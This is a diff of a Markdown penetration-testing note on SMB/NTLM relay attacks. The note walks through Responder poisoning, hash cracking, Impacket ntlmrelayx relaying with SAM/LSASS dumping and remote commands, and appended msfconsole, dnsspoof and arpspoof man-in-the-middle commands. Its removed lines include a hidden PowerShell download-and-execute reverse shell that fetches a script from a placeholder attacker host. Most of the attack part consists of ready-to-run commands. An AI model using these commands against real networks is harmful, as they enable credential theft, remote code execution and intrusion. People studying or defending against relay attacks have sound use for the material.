@@ -1,4 +1,3 @@
-# SMB Relay
 **SMB Relay** is a type of attack that targets the Server Message Block (SMB) protocol used primarily for providing shared access to files, printers, and serial ports in a network.
 
 The attack involves intercepting and relaying SMB authentication attempts to another SMB server, allowing an attacker to gain unauthorized access or execute commands with the victim's credentials.
@@ -21,53 +20,50 @@ The attack involves intercepting and relaying SMB authentication attempts to ano
 ## Attack Process
 
 1. **Configuring Responder**:
+
 - Modify the `Responder.conf` configuration file to enable or disable specific protocols. For SMB relay, ensure that SMB and HTTP are set to `On` and that `HTTP Server` is also enabled.
-```java
+```bash
 sudo nano /etc/responder/Responder.conf
 ```
-2. **Intercept**:
-- The attacker sets up a malicious SMB server to intercept authentication attempts.
-- The attacker needs to position themselves in the network to intercept SMB traffic (Man-in-the-Middle), this can be done with *Responder*.
-```java
-python3 Responder.py -I <interface> -dw
+- Responder is a tool used to capture SMB/NTLM authentication attempts from victims. It works by spoofing services like SMB, DNS, and HTTP to trick devices into sending authentication requests to the attacker.
+
+```bash
+responder -I eth0
 ```
-3. **Cracking hashes**:
+
+2. **Cracking hashes**:
 - After some time different user hashes would be captured by the Responder. All this hashes can be cracked using tools as *John* or *Hashcat* before executing the relay. 
 
-4. **Setting Up SMB Relay with Impacket**:
+3. **Setting Up SMB Relay with Impacket**:
 - Create a `targets.txt` file that contains the IP addresses of the target servers you want to relay the credentials to.
 - Use Impacket's **ntlmrelayx.py** script to relay the captured credentials to another target server.
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
-5. **Gaining access**:
-- Create a simple reverse shell payload that can be executed on the target host. For example, using PowerShell for a Windows target:
+4. **Gaining access**:
+Perform post-authentication actions:
+
+- Dump sensitive information (e.g., SAM database, LSASS memory).
+- Execute commands remotely.
+- Create a reverse shell.
 ```bash
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')"
-```
-	
--  Host the `shell.ps1` script on your attacker machine (e.g., using a simple HTTP server).
-```bash
-python3 -m http.server 80
-```
-- Run NTLMRelayx.py with the Reverse Shell Command:
-```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"iex(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')\""
+ntlmrelayx.py -tf targets.txt --dump
+ntlmrelayx.py -tf targets.txt -c "whoami"
 ```
 
-
-# NTLMRelayx.py
+## NTLMRelayx.py
 
 **ntlmrelayx.py** is a powerful tool from the Impacket toolkit used for relaying captured NTLM authentication attempts to other network services. It is particularly effective in Windows Active Directory (AD) environments, allowing attackers to gain unauthorized access to network resources by relaying credentials.
 
-## Configuring Target List:
+#### Configuring Target List:
 
 - Create a `targets.txt` file with the IP addresses or hostnames of the target AD servers you want to relay the captured credentials to.
 ```bash
 192.168.1.10 
 192.168.1.11
 ```
-## Starting NTLMRelayx.py:
+
+#### Starting NTLMRelayx.py:
 
 - Use NTLMRelayx.py to relay captured NTLM authentication attempts to the targets listed in `targets.txt`.
 ```bash
@@ -77,3 +73,11 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"
 ```
+msfconsole
+use windows/smb/smb_relay
+
+echo "ip *.domain" > dns
+dnsspoof -i eth1 -f dns
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth1 -t target getway
+arpspoof -i eth1 -t  gateway target
